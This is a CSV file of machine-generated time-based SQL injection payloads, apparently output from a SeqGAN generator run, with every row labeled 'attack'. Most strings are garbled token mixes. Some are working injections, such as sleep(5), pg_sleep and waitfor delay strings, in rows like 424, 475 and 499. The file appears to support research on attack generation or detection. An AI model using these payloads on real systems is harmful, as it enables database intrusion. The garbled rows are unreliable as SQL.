label,payload,family,payload_type,method,run_id,sample_index
attack,"""  (s if where 8594 '0:0:__TIME__'=  =  8781 ellt__uS    (  or 3885 delay froml and (  =  "" not 9443 sleep  (  3114  (  0x6d457153  (  f delay not  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,420
attack,"1  )    asspt kdonoai or  sleep  (  5   6866 delay delay information_schemawhere z  =  =  =  sleep or from sleep  (  sleep  (  5,sleep  (  sleep  ( delay d5  _  (  5  )  and    benchmark  (    (  )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,421
attack,"1""   )    )    <> @ohropo where 1361  (  =  , not  (  em if 24  6784 pg_sleep  =  from where 7739  =  (   delay not  =  =  _lt 1361 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,422
attack,"1   select not   (    ( "" or sleep  (  __TIME__  )    =  ""      sleep  (  5000000(  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,423
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """"  2388  = not  =     =    (  )    )    then not  (  _  =  select delayu waitfor not  (    =  select from from from delay 7629ll 6793 6784 delay  (  8781 -- from if delayelt (    sleep  =  8781  =  er 9862vell v  (  select 3824 delay '0:0:2' '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,424
attack,1 where 8781  =  from delay t 1361  =  benchmark  (  select not  =  =  f --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,425
attack,"'  delay and benchmark  (  _TIMD'  =  'd5  (  5000000,md5  (  5873      )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,426
attack,""" waitfor or sleep  (  ,md5  (  (  5873,mdME___  sleep  (    (  select )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,427
attack,1%`%' *  benchmark  p from and 4240 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,428
attack,1    3885 where 5702 not  =  = du not  (  select '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,429
attack,"1'   25      =  )    and benchmark and   waitfor ,sleep  (  6272,sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,430
attack,"1%""   )    or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,431
attack,"where 5466  , --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,432
attack,1   select;if not  (  select and not  =  (  sleep  (  7739  pg_sleep  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,433
attack, '  =  =  6784 delay delay delay not  (  (  =     7739 sleep  =  select waitfor  4240 delay and delay 7629 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434
attack,1s where (  )     waitfor delay 2657 delay 2388  =       not  =  =  3114  or delay or and sleep  (  5    )    )    )    or sleep  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435
attack,1 if 'sa' where 7629 --  (  (  6784 delay * not  --     (  (  =so 3885 delay not  (  5702 delay '0:0:2' '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436
attack,"1""   )    )   or when   ,5466  5 sleep  =  elt  (  1   (  3114 6784  =  =  _ waitfor delay  Eseltylq where 2657  =  8036  (  'sysadmin' and  or and if 4240  =  benchmark  (  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""a""   )    )    or sleep  (  __TIME__  )    =  "" e(( from delay where 6784  =  =  9443 dvr where 5702 6784 delay  = 6969  delay '0:0:2' '0:0:__TIME__'Mu from from (l delay '0:0:2' from not  7739 delay or from sleep  (  0x6d457153 d  (  (  5   )    )    select 8466lt  =  =  if where  (  8036 from information_schemael  (  (  3114 -- 8594  ( not not  (  =   not  (  8140 waitfor delay . where waitfor where delay and  '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438
attack,"""   )    )    or sleep  (  __TIME__  )    =  "" and  9443 sleep  9443  (  _TIME__TIME_sd5  10000000,md5  benchmark  (  0x6d457153   )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439
attack,"1""  )     as 1       or x s benchmark  =  (  ' eltlt  =  6456  = delay waitfor not  =  7739 from or delayu delay 4240 not  )     7260 sleep  = elt     2657  ,  =   from   1361 from where where6456  (  benchmark  ) pg_sleep --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,440
attack,"1'||  (  select 'a""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,441
attack,"1"" 1  )    a   and  select delay  =ivdn delay a     9443s elr where delay '0:0:2' if  waitfor from '0:0:10'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,442
attack,"f not,     (  ) --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,443
attack,"""  )  or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,444
attack,"1    (   )    )    or 8514 9862 from benchmark  (  10000000_T5   )    )    )     end,r   and elr where delay '0:0:2' 0  sleep  8781 delay from 6793 waitfor 9443  =  ( delay  and where =  (        (  6272   (  3114   '0:0:__TIME__'  6456  = 2840 5466  = whereel not   )  =  7739 from delay 8781 where delay -- if 5702 8140  =   notlp 'sa' ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,445
attack, delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,446
attack,"1""   )        or sleep  (    (  5 where 7739  =  =  5702 delaywaitfor '0:0:__TIME__'like or delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,447
attack,  ;; 6456' not  =    _ 7260  =  substring waitfor benchmark  (  (  select not  (  'isintegratedsecurityonly' not  (  =    (  'sysadmin'  select 2388 and or 2388  =   delay 1361  =  9443 from alo not  (  ' 5   =  ia'sa' epd '0:0:2' '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,448
attack,1ioor  delay =     (  = waitfor delay delay 8781 and delay and if--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,449
attack,"1%'""   )    as where eltbenchmark  (  5873 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,450
attack,"1'||  (  select 'kais7260ehnon from not  (  benchmark    ,1  5702  (  sleep  ( 5702 4240 waitfor delay and 6793 '0:0:__TIME__'from or 4240 delay and --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,451
attack,",1'||  (  select 'a$do 2388  =  =    ) where -- if not  =   where delay 4287 8036 from delay '0:0:__TIME__'  =  = from not  (  =   )    and 0  = delay 2840 3885 benchmark  (  )    )    or sleep  (  5  )    or delay 50  =    (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,452
attack,"1%"" 1 e'  =  '% 6784 ( waitfor sleep  =  ),c or duaatdi where 4287l 2657  =  6456s from 8781  from delay ( =  (  not 8781 ,2840 and     ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,453
attack,rk6784,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,454
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   ''  =  )   waitfor or 9443 delay 7629 delay (  s 0  = 8781 8140 = 3885 from where and where  =,v 6784  benchmark =  benchmark  ()    )    )    ae2525waitfor sleep     (  2657lo delay and not  (3114(  =  ' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,455
attack,"""  )   and from pg_sleep  (  __TIME___TIME___TIME__  3114  (  ((    _TIME_TIME___  (  0x6d457153   (  IMD5    (      0x4c4d6142   )    )    c  )   =    )    se:24yt  select sleep  ( =  iwaitfor 7629 delay delay delay delay '0:0:__TIME__',,sleep not 5702 not  =  * from sleep  (  =    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,456
attack,1 4287 l --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,457
attack,1'  zlrt  )    )    waitfor delay not  'isintegratedsecurityonly'       (  6456    )    )    and not  (  3114 '0:0:2'_ 3885       benchmark  (  5873  (    =he ll eltlt 8781   s x delay 'sa' where 5466 1 from elt  (    =  sleep delay or from where 6969  =  )  6784 waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,458
attack," delay * pg_sleep  )  , delay not  (  (  =  3114 or 4287 delay delay '0:0:2' from from * --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,459
attack,"1%""    )  x; p * delay and waitfor '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,460
attack," 4287   ,z not  ) 3824  =    =  =  'isintegratedsecurityonly'   )    ao  waitfor from benchmark  )  waitfor delay not  'enpn' from and delay not =    (  select and   (  sleep  (  5   )    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,461
attack,1    )    else delay delay 50 not  (  1361 7629 6456  benchmark  (  )  sleep  )    =    )    1361waitfor delay 8036   '0:0:2' ct and '0:0:2' pg_sleep  (  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,462
attack,"1 where 8036 7629  =  8036 8036  (  3885 2657 delay from delay 7260  (  )    t 8781 =  (  (  select delay,sleep  =  5  2388  =  (  5000000,l x where m  =let  (  =  6272 6784 waitfors  '0:0:2' x delay ),waitfor if 6969 from 6456  2657c el  =  =   '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,463
attack,"""  ),waitfor     waitfor  = delay not  7260 i delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,464
attack,1 s '0:0:2' delay  * '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,465
attack,"$,waitfor waitfor from from not  (  =sehtete6456  )    or delay from --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,466
attack, if waitfor  and --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,467
attack,"1  )    s elt  (  )  '  )    and and delay or  =  7260 or eltt  (  =      9443 5466 and not  (   4287 waitfor not from 9443  (  sleep  (     (  7260 pg_sleep 8036 if 9443  from '0:0:__TIME__'sleep  (  3114  (  =  5873 delay 8140 delay '0:0:__TIME__'-- pg_sleep  =    3114 delay from * 4240 sleep  (  =  =  sleep  3114  (  3114  (  =  =  = 5702    =  s from (  =  ,'  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,468
attack,1 or  (    =  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,469
attack,"$,1  )  ;sleep and where 7739 if 6793 pg_sleep  =  =  el (  ( from where a ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,470
attack,7739  =s information_schemaser c5466 '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,471
attack,1 where * waitfor not  benchmark  =  (  5702 <> delay <> delay= 8036  (  =   5466 where not  (  =  ' delay '0:0:__TIME__'-- and 6793 and not  (  ( _T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,472
attack,"1'axwherey 3885 delay '0:0:2' not  sleep  9443  ,md5  )  )  5  1  <> 1 8594 froms0    waitfor 8140 (    )  =  1  s ise if s pem where  =  8036 kT=  3114 and not  =  8036 7629  =  =  =  8781 '0:0:2' 1  0x6d457153    5466 from '0:0:2' delay where from waitfor  e and or 8594 delay not --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,473
attack," $ where '0:0:2' 4240 '0:0:2'  delay ( not  =elt  6784l s ellllt  3114,  (  '  (  (  5 not 9443 sleep  _  (  _  5 9443 (   (  then 2388  =  5000000I delay not  (  ' and from pg_sleep  ( where 8036 8781  4287 delay notl waitfor  =  (  =  from 8036  e or or from 6793 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,474
attack,"1'||  (  select 'v' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'f'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,475
attack,"1 where% 8594 not  =  sleep  =  ' waitfor delay delay  and  2657 and     =  l delay where delay  not   7739  =  6456 delay 4240 and from 8594 delay '0:0:2' 7629  =  select = 6784  =  waitfor  waitfor delay waitfor and not  (  8036 '0:0:2' from when waitfor  2840 )  1361  ,l x not  (, and if not  (  4287 if not    =     = (  =  f '0:0:2' 6793 )      =  from and  not",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,476
attack,"""  =  ""    =    )    or D delay (  = benchmark  (  )    )    )    or  =  '  =  6456 =  =  =  5000000 '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,477
attack,",1 if where 9443  (   )    )    where waitfor '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,478
attack,""" )  from  waitfor from if pg_sleep  5 from where delayu andalk benchmark  (   =   )    like waitfor delay and delay d  7629 6456  3885 delay and elt  (  =  ,m  =  =  substring not  =  -- information_schema.io  sleep  (  )    (   7629 and (  (  waitfor * delay delay k or from _  (  benchmark  3114  =  7629 s  from ' delay 4240  '0:0:__TIME__'waitfor el from not  =  8036  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,479
attack,1'   )        as not  )  ifdks  elt delay pg_sleep  (  l 3885 delay delay not  =   not  3885  =      = 2840 5466 8781 =  (  3114 '0:0:2' '0:0:__TIME__'waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,480
attack,""" 0  )  or'e sleep  ( sleep  (  =    y waitfor      , if where 8036h delay not and 4240 9443   from  1361 delay  '0:0:__TIME__'      =  )    )     waitfor  =  ' when  =l not  (  ,6456, where from 8594  (  =  ' delay waitfor x 7629  where 1361  if from 2388  (  5702  and e,sleep ,(  delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,481
attack,  )    )    and delay benchmark sleep  (  _TIME_T' and from 8514  3885 delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,482
attack,"""  25,1  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,483
attack,"1%""   ;waitfor and   not  (  2657 where and  =  =  s where =  =  mduwaitfor where  =  =  sleep  (  =    )   )    aasseler erbriwhere (  =   8594 '0:0:__TIME__'=  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,484
attack,1 k  '0:0:__TIME__'-- 2388  =  x  =    )   waitfor from '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,485
attack,""" <> 3885 9443 -- delay from sleep  sleep  (  5   )    )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,486
attack,"11%""   )    ape   sscio from 8781 * 'sa' delay '0:0:__TIME__'    =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,487
attack,"1"" or 1361  ,sleep  =  delay '0:0:2' )        =     from do 4240 waitfor delay <>(  =  ,""  =  "" delay 6969      or not  ()    =  benchmark  (  select 4240 8036 delay '0:0:__TIME__',       1361 ,m 8781  =  8 =  9443 not  =  ( 4240 =  8036 delay '0:0:2' '0:0:2' delay u '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,488
attack,"isc"" )  <>  )        awaitfor delay or from '0:0:__TIME__'(",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,489
attack,1'||  (  select 'rnlikei end  (  =  sleep      5873  5 dbn  (  end_  _T =  waitfor '0:0:__TIME__'      =   (  8781  (  )    or --% delay not  (    '  delay 1361  =  =  (  =  case delay '0:0:__TIME__'-- or d 2388  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,490
attack,1  6866 and if 9443 '0:0:__TIME__'waitfor and 4240lt --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,491
attack,"1%"" where and 8466 benchmark  (  )    delay or not  (  (  =   'enpn'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,492
attack,""" #""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,493
attack,"sleep (  3114,d elt  8036      ,m  (  ' x 9443 -- waitfor delay from delay 8140 p where where not  y delay select '0:0:2' from  1 delay --f not  )   as selt delay ahor where,     and h not  =  =  'isintegratedsecurityonly' not  5  )  )    and 8514 waitfor sleep  (      =   sleep  =  (  =  )    )    or = )    ,  8781 delay not)    (  select  waitfor from 8594  =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,494
attack,"1'||  (  select 'ipe""   )    )    or sleep  (  __TIME__  )    =  ""r  )    a waitfor  =  u sleep 50   when 'sa' 8781  =  ( 6793 5466  =  'isintegratedsecurityonly' sleep     '0:0:2' 3824 '0:0:__TIME__'sleep  =  3114  (  6456 waitfor and 2657  7739 not  =   10000000,delay not  (  5873 delay  s '0:0:2' when --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,495
attack,""" where 6784 delay '0:0:2' delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,496
attack,; and  and from benchmark  (  3114  (  'isintegratedsecurityonly'   6272 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,497
attack,"1%""  ; and not  waitfor(  (  6784 elt  (   s where (  =  8781 5466 =     (  )     delay or  benchmark  (  'isintegratedsecurityonly' v7739 and *  (  8140  =   2840 delay waitfor not  (  benchmark  (  TIMif 5466"" waitfor 6456 waitfor delay '0:0:__TIME__'or delay delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,498
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  """"  )   rlike sleep  (  5  )   and   (  ""'||  (  select 'sie;  '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,499
